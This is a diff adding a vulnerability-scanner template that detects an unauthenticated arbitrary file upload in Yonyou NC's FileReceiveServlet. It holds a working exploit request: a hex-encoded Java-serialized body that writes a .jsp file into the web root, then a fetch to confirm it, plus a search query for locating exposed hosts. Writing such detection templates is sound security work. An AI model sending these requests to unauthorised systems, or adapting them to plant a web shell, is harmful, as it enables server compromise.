@@ -1,0 +1,40 @@
+id: yonyou-filereceiveservlet-fileupload
+
+info:
+  name: Yonyou NC FileReceiveServlet - Aribitrary File Upload
+  author: bjxsec
+  severity: critical
+  description: |
+    An unauthorized attacker can upload a file via the FileReceiveServlet endpoint.
+  reference:
+    - https://github.com/zan8in/afrog/blob/main/v2/pocs/afrog-pocs/vulnerability/yonyou-nc-arbitrary-file-upload.yaml
+  metadata:
+    verified: true
+    max-request: 2
+    fofa-query: app="用友-UFIDA-NC"
+  tags: yonyou,file-upload,intrusive
+variables:
+  file_name: "{{to_upper(rand_text_alphanumeric(5))}}.jsp"
+  file_content: "{{randstr}}"
+
+http:
+  - raw:
+      - |
+        POST /servlet/FileReceiveServlet HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data;
+
+        {{hex_decode("ACED0005737200116A6176612E7574696C2E486173684D61700507DAC1C31660D103000246000A6C6F6164466163746F724900097468726573686F6C6478703F4000000000000C7708000000100000000274000946494C455F4E414D45740009")}}{{file_name}}{{hex_decode("7400105441524745545F46494C455F504154487400102E2F776562617070732F6E635F77656278")}}{{file_content}}
+      - |
+        GET /{{file_name}} HTTP/1.1
+        Content-Type: application/x-www-form-urlencoded
+        Host: {{Hostname}}
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "status_code_1 == 200 && status_code_2 == 200"
+          - "contains(body_2, '{{file_content}}')"
+        condition: and
+
+# digest: 4b0a00483046022100bcdd65a14f3b8e796052630e724be45467f76197107285966d6a7a61f9458843022100f885cd8e13691c8579d864cf24aa7101fdc0fbc2971b636556270d61a131073c:922c64590222798bb761d5b6d8e72950
